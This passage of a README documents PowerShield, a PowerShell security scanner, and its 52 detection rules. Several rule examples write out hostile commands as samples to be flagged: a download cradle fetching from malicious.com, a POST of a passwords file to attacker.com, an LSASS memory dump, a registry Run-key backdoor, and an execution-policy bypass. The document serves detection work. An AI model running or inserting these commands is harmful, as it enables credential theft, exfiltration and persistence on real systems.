[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
    param($sender, $cert, $chain, $errors)
    # Implement proper certificate validation
    return $errors -eq [System.Net.Security.SslPolicyErrors]::None
}
```

### 5. Execution Policy Bypass ⭐ NEW
**Severity**: Critical  
**Description**: Detects attempts to bypass PowerShell execution policy

**Example Violation**:
```powershell
# ❌ Bad - Bypasses execution policy
Set-ExecutionPolicy Bypass -Force

# ✅ Good - Use appropriate policy
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

### 6. Unsafe PowerShell Remoting ⭐ NEW
**Severity**: Critical  
**Description**: Detects insecure PowerShell remoting configurations

**Example Violation**:
```powershell
# ❌ Bad - Remoting without SSL
Enter-PSSession -ComputerName Server01 -UseSSL:$false

# ✅ Good - Use SSL encryption
Enter-PSSession -ComputerName Server01 -UseSSL
```

### 7. PowerShell Version Downgrade ⭐ NEW
**Severity**: Critical  
**Description**: Detects PowerShell v2 usage which bypasses modern security features

**Example Violation**:
```powershell
# ❌ Bad - Uses vulnerable PowerShell v2
powershell.exe -version 2 -command "malicious code"

# ✅ Good - Use modern PowerShell
pwsh -command "safe code"
```

### 8. Privilege Escalation ⭐ NEW
**Severity**: Critical  
**Description**: Detects attempts to elevate privileges

**Example Violation**:
```powershell
# ❌ Bad - Elevates without validation
Start-Process -FilePath "cmd.exe" -Verb RunAs

# ✅ Good - Check if elevation is necessary
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Handle appropriately
}
```

### 9-16. Additional PowerShell-Specific Rules ⭐ NEW
- **Script Block Logging**: Detects disabled security logging
- **Dangerous Modules**: Identifies imports from untrusted sources
- **Unsafe Deserialization**: Finds unsafe XML/CLIXML deserialization
- **Script Injection**: Detects dynamic script generation vulnerabilities
- **Unsafe Reflection**: Finds unsafe .NET reflection usage
- **Constrained Mode**: Detects patterns breaking constrained language mode
- **Unsafe File Inclusion**: Identifies dot-sourcing of untrusted scripts
- **PowerShell Web Requests**: Detects unvalidated web requests

### 47-52. Advanced Attack Detection Rules 🛡️ NEW

#### 47. PowerShell Obfuscation Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1027, T1027.010, T1059.001  
**Description**: Detects obfuscation techniques used to hide malicious code

**Patterns Detected**:
- Base64 encoded commands (`-EncodedCommand`, `FromBase64String`)
- Excessive string concatenation (5+ operations)
- Character code conversion (multiple `[char]` casts)
- Format string obfuscation (5+ placeholders)
- String reversal (`ToCharArray`, `Reverse`)

**Example**:
```powershell
# ❌ Bad - Base64 encoded malicious command
powershell.exe -enc "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="

# ✅ Good - Clear, readable code
Invoke-WebRequest -Uri "https://example.com"
```

#### 48. Download Cradle Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1105, T1059.001, T1204.002, T1027.004, T1620, T1197  
**Description**: Detects download cradles that fetch and execute remote code

**Patterns Detected**:
- `IEX (New-Object Net.WebClient).DownloadString(...)`
- Web requests piped to IEX
- BitsTransfer followed by execution
- Reflective assembly loading from web

**Example**:
```powershell
# ❌ Bad - Download and execute without disk access
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

# ✅ Good - Download with validation
$script = Invoke-WebRequest -Uri "https://trusted.com/script.ps1"
# Review content before execution
```

#### 49. Persistence Mechanism Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1547.001, T1053.005, T1546.003  
**Description**: Detects persistence techniques that survive reboots

**Patterns Detected**:
- Registry Run key modifications
- Scheduled task creation
- WMI event subscriptions
- PowerShell profile modifications
- Startup folder changes

**Example**:
```powershell
# ❌ Bad - Creates persistence via registry
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware.exe"

# ✅ Good - Use legitimate installation methods
# Install through proper package management
```

#### 50. Credential Harvesting Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1003.001, T1003.002, T1555.003  
**Description**: Detects credential theft and password dumping

**Patterns Detected**:
- Mimikatz keywords and patterns
- LSASS process dumping
- Browser credential extraction
- WiFi password dumping
- Registry hive extraction (SAM, SYSTEM)

**Example**:
```powershell
# ❌ Bad - Dumps LSASS memory
Get-Process lsass | Out-Minidump -DumpFilePath C:\Temp\lsass.dmp

# ✅ Good - Use proper credential management
$cred = Get-Credential
# Use SecureString for credentials
```

#### 51. Lateral Movement Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1021.006, T1021.002, T1047  
**Description**: Detects techniques to spread across networks

**Patterns Detected**:
- Remote WMI/CIM execution
- Remote scheduled tasks
- SMB share enumeration
- PSRemoting with credentials
- Pass-the-Hash techniques

**Example**:
```powershell
# ❌ Bad - Remote execution without proper authorization
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName "target-server"

# ✅ Good - Use authorized remote management
Enter-PSSession -ComputerName "authorized-server" -ConfigurationName "RestrictedEndpoint"
```

#### 52. Data Exfiltration Detection
**Severity**: Critical  
**MITRE ATT&CK**: T1048.003, T1041, T1567.001  
**Description**: Detects data exfiltration to external locations

**Patterns Detected**:
- DNS tunneling (DNS queries in loops)
- HTTP POST with large data
- Pastebin/GitHub Gist uploads
- Cloud storage uploads (Dropbox, S3, Azure Blob)
- Email with attachments
- Data compression before upload

**Example**:
```powershell
# ❌ Bad - Exfiltrates data to external site
$data = Get-Content "C:\Sensitive\passwords.txt"
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body $data

# ✅ Good - Use authorized data transfer methods
# Transfer data through approved channels with proper logging
```

For detailed examples of all rules, see the [test scripts](tests/TestScripts/) organized by category:
- [PowerShell-specific rules](tests/TestScripts/powershell/)
- [Network security rules](tests/TestScripts/network/)
- [File system security rules](tests/TestScripts/filesystem/)
- [Registry security rules](tests/TestScripts/registry/)
- [Data security rules](tests/TestScripts/data/)

## 📋 Complete Security Rules Catalogue

PowerShield includes **52 comprehensive security rules** organized into the following categories:

### Core Security Rules (4 rules)

1. **InsecureHashAlgorithms** (High)  
   Detects usage of cryptographically weak hash algorithms (MD5, SHA1, RIPEMD160)

2. **CredentialExposure** (Critical)  
   Detects potential credential exposure in scripts (plaintext passwords, insecure credential handling)

3. **CommandInjection** (Critical)  
   Detects potential command injection vulnerabilities (unsafe Invoke-Expression usage)

4. **CertificateValidation** (High)  
   Validates certificate security practices (certificate validation bypasses)

### PowerShell-Specific Security Rules (16 rules)

5. **ExecutionPolicyBypass** (Critical)  
   Detects attempts to bypass PowerShell execution policy

6. **ScriptBlockLogging** (High)  
   Detects disabling of security logging configuration

7. **UnsafePSRemoting** (Critical)  
   Detects insecure PowerShell remoting configurations

8. **DangerousModules** (High)  
   Detects import of modules from untrusted sources

9. **PowerShellVersionDowngrade** (Critical)  
   Detects PowerShell version downgrade attacks (PS v2 usage)

10. **UnsafeDeserialization** (High)  
    Detects unsafe XML/CLIXML deserialization

11. **PrivilegeEscalation** (Critical)  
    Detects privilege escalation attempts

12. **ScriptInjection** (Critical)  
    Detects dynamic script generation vulnerabilities

13. **UnsafeReflection** (High)  
    Detects unsafe .NET reflection usage

14. **PowerShellConstrainedMode** (Medium)  
    Detects patterns that may break in constrained language mode

15. **UnsafeFileInclusion** (Critical)  
    Detects dot-sourcing of untrusted scripts

16. **PowerShellWebRequests** (High)  
    Detects web requests without proper certificate validation

17. **JEAConfigurationVulnerabilities** (High)  
    Detects security vulnerabilities in JEA (Just Enough Administration) configurations

18. **DSCSecurityIssues** (High)  
    Detects security issues in DSC (Desired State Configuration) scripts

19. **DeprecatedCmdletUsage** (Medium)  
    Detects usage of deprecated cmdlets and methods that have security or compatibility issues

20. **EnhancedPowerShell2Detection** (High)  
    Detects PowerShell 2.0 usage and related security bypass techniques

### Network Security Rules (3 rules)

21. **InsecureHTTP** (High)  
    Detects unencrypted HTTP requests in web cmdlets

22. **WeakTLS** (High)  
    Detects weak TLS/SSL configuration and protocol downgrades

23. **HardcodedURLs** (Medium)  
    Detects hardcoded production URLs and endpoints

### File System Security Rules (4 rules)

24. **PathTraversal** (High)  
    Detects directory traversal vulnerabilities

25. **UnsafeFilePermissions** (Medium)  
    Detects overly permissive file/folder permissions

26. **TempFileExposure** (Medium)  
    Detects unsafe temporary file handling

27. **UnsafeFileOperations** (High)  
    Detects dangerous file operations without validation

### Registry Security Rules (3 rules)

28. **DangerousRegistryModifications** (High)  
    Detects unsafe registry modifications affecting security settings

29. **RegistryCredentials** (Critical)  
    Detects credentials stored in registry keys

30. **PrivilegedRegistryAccess** (Medium)  
    Detects unnecessary privileged registry operations

### Data Security Rules (4 rules)

31. **SQLInjection** (Critical)  
    Detects unsafe database query construction

32. **LDAPInjection** (High)  
    Detects unsafe directory service queries

33. **XMLSecurity** (High)  
    Detects XXE and unsafe XML parsing vulnerabilities

34. **LogInjection** (Medium)  
    Detects unsafe logging that could lead to log injection

### Advanced Evasion Detection Rules (3 rules)

35. **AMSIEvasion** (Critical)  
    Detects Anti-Malware Scan Interface (AMSI) bypass attempts

36. **ETWEvasion** (Critical)  
    Detects Event Tracing for Windows (ETW) manipulation and bypass attempts

### Azure Cloud Security Rules (11 rules)

37. **AzurePowerShellCredentialLeaks** (Critical)  
    Detects Azure PowerShell credential exposure and unsafe authentication patterns

38. **AzureResourceExposure** (High)  
    Detects unsafe Azure resource configurations that may expose data or services

39. **AzureEntraIDPrivilegedOperations** (Critical)  
    Detects dangerous Azure Entra ID (Azure AD) privileged operations

40. **AzureDataExfiltration** (Critical)  
    Detects potential data exfiltration attempts from Azure services

41. **AzureLoggingDisabled** (High)  
    Detects attempts to disable Azure logging and monitoring

42. **AzureSubscriptionManagement** (High)  
    Detects unsafe Azure subscription management operations

43. **AzureComputeSecurityViolations** (High)  
    Detects insecure Azure VM and container configurations

44. **AzureDevOpsSecurityIssues** (Medium)  
    Detects security issues in Azure DevOps configurations

45. **AzureEncryptionBypass** (High)  
    Detects attempts to disable encryption on Azure resources

46. **AzurePolicyAndCompliance** (High)  
    Detects modifications to Azure policy and compliance settings

### Advanced Attack Pattern Detection Rules (6 rules)

47. **PowerShellObfuscationDetection** (Critical)  
    Detects obfuscation techniques commonly used in malicious PowerShell scripts  
    *MITRE ATT&CK: T1027, T1027.010, T1059.001*

48. **DownloadCradleDetection** (Critical)  
    Detects download cradles that fetch and execute remote code without touching disk  
    *MITRE ATT&CK: T1105, T1059.001, T1204.002, T1027.004*

49. **PersistenceMechanismDetection** (Critical)  
    Detects persistence mechanisms that allow malware to survive system reboots  
    *MITRE ATT&CK: T1547.001, T1053.005, T1546.003*

50. **CredentialHarvestingDetection** (Critical)  
    Detects credential harvesting and password dumping techniques  
    *MITRE ATT&CK: T1003.001, T1003.002, T1555.003*

51. **LateralMovementDetection** (Critical)  
    Detects lateral movement techniques used to spread across networks  
    *MITRE ATT&CK: T1021.006, T1021.002, T1047*

52. **DataExfiltrationDetection** (Critical)  
    Detects data exfiltration techniques that send data to external locations  
    *MITRE ATT&CK: T1048.003, T1041, T1567.001*

### Rules Summary by Severity

- **Critical**: 23 rules
- **High**: 23 rules  
- **Medium**: 6 rules
- **Total**: 52 rules

### Compliance & Framework Mapping

All rules are mapped to industry-standard security frameworks:
- **CWE (Common Weakness Enumeration)**: Specific weakness IDs for each rule
- **MITRE ATT&CK**: Threat technique mappings for attack pattern rules
- **OWASP Top 10 2021**: Web application security categories
- **Compliance Frameworks**: NIST, CIS, SOC 2, PCI-DSS, HIPAA coverage

For detailed detection patterns, remediation guidance, and examples, see:
- [Advanced Attack Detection Guide](docs/ADVANCED_ATTACK_DETECTION.md)
- [Test Scripts by Category](tests/TestScripts/)
- [Enhanced SARIF Output Documentation](docs/Enhanced-SARIF-Output.md)

## 🤖 AI Auto-Fix

PowerShield includes an AI-powered auto-fix action that can automatically remediate security violations:

```yaml
- name: Apply AI Fixes
  uses: ./actions/copilot-autofix
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    violations-file: 'powershield-results.json'
    apply-fixes: true
    confidence-threshold: 0.8
```

**Features**:
- Generates fixes based on security best practices
- Confidence scoring for each fix
- Applies fixes only when confidence threshold is met
- Creates detailed commit messages

## 📊 Enhanced SARIF Integration

PowerShield generates **SARIF 2.1.0** output with comprehensive security metadata that integrates with GitHub's Security tab and other security tools:

### Key Features

1. **Rich Metadata** - Every violation includes:
   - CWE (Common Weakness Enumeration) IDs
   - MITRE ATT&CK technique mappings
   - OWASP Top 10 2021 categories
   - Help URLs with remediation guidance

2. **Automated Fix Suggestions** - Many rules provide multiple fix alternatives directly in SARIF
3. **Code Flow Tracking** - Complex vulnerabilities include data flow visualization
4. **GitHub Integration** - Results appear in Security → Code scanning tab with enhanced categorization

### Example Enhanced Rule

```json
{
  "id": "InsecureHashAlgorithms",
  "helpUri": "https://cwe.mitre.org/data/definitions/327.html",
  "properties": {
    "cwe": ["CWE-327", "CWE-328"],
    "mitreAttack": "T1553.002",
    "owasp": "A02:2021-Cryptographic Failures"
  }
}
```

### Benefits

- **Better Categorization** - Rules grouped by CWE and OWASP categories
- **Quick Fixes** - Suggested fixes appear directly in GitHub UI
- **Threat Context** - MITRE ATT&CK shows real-world attack scenarios
- **Compliance Ready** - Direct mappings for audit and compliance reports

See [Enhanced SARIF Output Documentation](./docs/Enhanced-SARIF-Output.md) for complete details.

## ⚙️ Configuration

PowerShield includes configurable options for customizing analysis behavior.

### Excluded Paths

By default, PowerShield excludes test scripts from workspace analysis to avoid flagging intentional violations used for testing:

```powershell
# Default exclusions
$analyzer.Configuration.ExcludedPaths = @(
    'tests/TestScripts',
    '*/TestScripts',
    'test/*',
    'tests/*'
)
```

Test scripts are still analyzed individually in the `test-analyzer` workflow job to verify the scanner is working correctly.

### Custom Configuration

```powershell
# Create analyzer with custom configuration
$analyzer = New-SecurityAnalyzer
$analyzer.Configuration.MaxFileSize = 20MB
$analyzer.Configuration.TimeoutSeconds = 60
$analyzer.Configuration.ExcludedPaths += 'vendor/*'
```

## 🛠️ Development

### Project Structure
```
PowerShield/
├── .github/
│   ├── workflows/              # GitHub Actions workflows
│   └── copilot-instructions.md # Copilot agent instructions
├── actions/                    # Custom GitHub Actions
│   └── copilot-autofix/       # AI auto-fix action
├── src/                        # Core analyzer modules
│   ├── PowerShellSecurityAnalyzer.psm1
│   ├── ConfigLoader.psm1
│   ├── SuppressionParser.psm1
│   ├── CIAdapter.psm1
│   ├── ArtifactManager.psm1
│   ├── CustomRuleLoader.psm1
│   └── InputValidation.psm1
├── scripts/                    # Utility scripts
│   ├── Convert-ToSARIF.ps1
│   ├── Generate-SecurityReport.ps1
│   ├── Export-ToJUnit.ps1
│   ├── Export-ToTAP.ps1
│   └── Export-ToCSV.ps1
├── tests/
│   └── TestScripts/           # Scripts with known violations
│       ├── powershell/        # PowerShell-specific tests
│       ├── network/           # Network security tests
│       ├── filesystem/        # File system tests
│       ├── registry/          # Registry security tests
│       └── data/              # Data security tests
├── docs/                       # User documentation
│   ├── implementation/        # Implementation guides
│   └── examples/              # Example configurations
├── rules/                      # Custom and community rules
│   ├── custom/                # Organization-specific rules
│   ├── community/             # Community contributed rules
│   └── templates/             # Rule templates
├── tools/                      # Enterprise tools
│   ├── Migrate-FromPSScriptAnalyzer.ps1
│   └── Calculate-PowerShieldROI.ps1
├── integrations/               # CI/CD platform integrations
│   ├── azure-devops/
│   ├── gitlab/
│   ├── jenkins/
│   ├── circleci/
│   └── teamcity/
├── buildplans/                 # Technical planning docs
│   ├── TechnicalPlan.md
│   ├── phase-1-master-plan.md
│   └── SoftwarePlan/
├── psts.ps1                    # CLI entry point
└── powershield.ps1             # Legacy CLI (compatibility)
```

### Running Tests

```powershell
# Test the analyzer on sample vulnerable scripts
pwsh -Command "
    Import-Module ./src/PowerShellSecurityAnalyzer.psm1
    Get-ChildItem ./tests/TestScripts -Filter *.ps1 -Recurse | ForEach-Object {
        Write-Host \"Testing: $($_.FullName)\"
        $result = Invoke-SecurityAnalysis -ScriptPath $_.FullName
        Write-Host \"  Violations: $($result.Violations.Count)\"
    }
"
```

### Building the Auto-Fix Action

```bash
cd actions/copilot-autofix
npm install
npm run build
```

### Developer Documentation

- **[Technical Plan](buildplans/TechnicalPlan.md)**: Complete implementation roadmap
- **[Phase 1 Master Plan](buildplans/phase-1-master-plan.md)**: Comprehensive Phase 1 strategy
- **[Phase 1 Implementation Plan](buildplans/SoftwarePlan/Phase_1_GitHub_Workflow_Implementation.md)**: Detailed GitHub integration
- **[Developer Implementation Guide](docs/implementation/copilot.md)**: Architecture and development guide
- **[Implementation Summary](docs/implementation/IMPLEMENTATION_SUMMARY.md)**: v1.0.0 foundation

## 🏢 Enterprise Features

PowerShield includes enterprise-ready features for team collaboration and compliance:

### Webhook Notifications

Send real-time security alerts to your team communication platforms:

```yaml
# .powershield.yml
webhooks:
  - url: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
    format: "Slack"
    events: ["critical_found", "analysis_complete"]
    severity_filter: ["Critical", "High"]
```

**Features:**
- 🎨 **Rich Formatting**: Slack Block Kit and Teams Adaptive Cards
- 🎯 **Event Filtering**: critical_found, analysis_complete, fix_applied
- 📊 **Severity Filtering**: Focus on Critical/High issues
- 🔗 **Action Buttons**: Direct links to CI/CD builds
- 📈 **Top Issues**: Highlights most critical violations

**Supported Platforms:**
- Slack (with interactive Block Kit)
- Microsoft Teams (with Adaptive Cards)
- Generic webhooks (JSON payload)

**Testing:**
```powershell
# Test your webhook configuration
./scripts/Test-Webhooks.ps1 -Interactive

# Dry run (generate payloads without sending)
./scripts/Test-Webhooks.ps1 -DryRun
```

📚 **[Full Webhook Documentation](docs/webhook-integration.md)**

### Pester Security Testing

Automated security testing and fix validation:

```yaml
# .powershield.yml
integrations:
  pester:
    enabled: true
    security_tests: "./tests/Security.Tests.ps1"
    run_after_fixes: true
    validate_fixes: true
```

**Features:**
- ✅ **Auto-Generated Tests**: Security tests based on analysis results
- 🔄 **Fix Validation**: Verify fixes don't break functionality
- 🛡️ **Regression Prevention**: Ensure fixed vulnerabilities don't reappear
- 📝 **Custom Tests**: Project-specific security requirements
- 📊 **CI/CD Integration**: Automated testing in pipelines

**Usage:**
```powershell
# Generate security tests
Import-Module ./src/PesterIntegration.psm1
$integration = New-PesterIntegration -Configuration @{ enabled = $true }
New-SecurityTests -Integration $integration -AnalysisResult $result

# Run fix validation pipeline
$testResult = Invoke-FixValidation `
    -AnalysisResult $result `
    -AppliedFixes $fixes `
    -PesterConfig @{ enabled = $true }
```

📚 **[Full Pester Documentation](docs/pester-integration.md)**

## 🔐 Security

PowerShield is designed with security in mind:
- No external dependencies for core analysis
- Runs in isolated containers (Phase 3)
- No data sent to external services
- All processing happens locally or in GitHub Actions

## 🤝 Contributing

Contributions are welcome! Please see our contributing guidelines.

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests for new features
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🗺️ Roadmap

- [x] **Phase 1**: GitHub Workflow Integration
  - [x] Core security analyzer
  - [x] GitHub Actions workflow
  - [x] SARIF output
  - [x] AI auto-fix action
  
- [ ] **Phase 2**: VS Code Extension
  - [ ] Real-time analysis
  - [ ] Multi-AI provider support
  - [ ] Code actions and quick fixes
  
- [ ] **Phase 3**: Standalone Application
  - [ ] Electron desktop app
  - [ ] Docker sandbox isolation
  - [ ] Local AI integration
  - [ ] Enterprise features

## 💬 Support

- 📚 [Documentation](https://github.com/J-Ellette/PowerShellTestingSuite/wiki)
- 🐛 [Issue Tracker](https://github.com/J-Ellette/PowerShellTestingSuite/issues)
- 💡 [Discussions](https://github.com/J-Ellette/PowerShellTestingSuite/discussions)

---

**Made with ❤️ for PowerShell security**
